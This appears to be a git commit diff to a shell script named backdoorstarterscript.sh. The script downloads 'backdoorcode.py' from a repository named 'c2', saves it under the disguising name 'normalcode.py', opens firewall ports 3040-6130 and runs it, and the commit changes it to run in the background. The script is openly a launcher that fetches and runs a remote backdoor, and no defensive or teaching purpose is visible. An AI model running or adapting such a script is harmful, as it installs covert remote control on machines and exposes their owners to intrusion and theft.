efd1bc67491ab8e7538d5520b1a087fa198ca832
anmolmittal13 <72708880+anmolmittal13@users.noreply.github.com>
2023-12-07 00:53:23 -0600

    Update backdoorstarterscript.sh

--- backdoorstarterscript.sh
+++ backdoorstarterscript.sh
@@ -1,4 +1,3 @@
-sudo strace -o /dev/null /bin/bash
 yum install -y python3;
 pip3 install --upgrade pip;
 pip3 install setuptools_rust;
@@ -6,4 +5,4 @@ pip3 install cryptography;
 curl -o normalcode.py https://raw.githubusercontent.com/anmolmittal13/c2/main/backdoorcode.py
 chmod +x normalcode.py;
 firewall-cmd --add-port=3040-6130/tcp;
-python3 normalcode.py;
+python3 normalcode.py &;
